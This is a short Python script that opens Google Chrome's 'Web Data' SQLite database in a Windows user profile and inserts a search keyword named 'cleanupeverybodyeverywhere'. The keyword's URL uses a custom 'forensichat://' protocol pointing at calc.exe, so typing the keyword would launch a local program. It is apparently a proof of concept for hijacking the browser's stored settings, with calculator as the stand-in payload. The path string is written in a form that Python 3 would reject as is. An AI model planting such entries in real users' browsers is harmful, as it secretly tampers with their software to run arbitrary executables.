import sqlite3 as lite
con = lite.connect('C:\Users\steal\AppData\Local\Google\Chrome\User Data\Default\Web Data')
c = con.cursor()
#idmax = c.execute('SELECT MAX(id) FROM keywords')
#c.execute("INSERT INTO keywords  VALUES ('cleanupeverybodyeverywhere','cleanupeverybodyeverywhere','','forensichat://C:>Windows>System32>calc.exe',0,'',0,0,'',0,'',0,0,'',0,'','','','','','','','','')")
c.execute("SELECT * FROM keywords WHERE short_name='cleanupeverybodyeverywhere'")
foo = c.fetchall()
if foo == []:
	c.execute("INSERT INTO keywords (short_name,keyword,url,favicon_url) VALUES ('cleanupeverybodyeverywhere','cleanupeverybodyeverywhere','forensichat://C:>Windows>System32>calc.exe','')")
	con.commit()
con.close()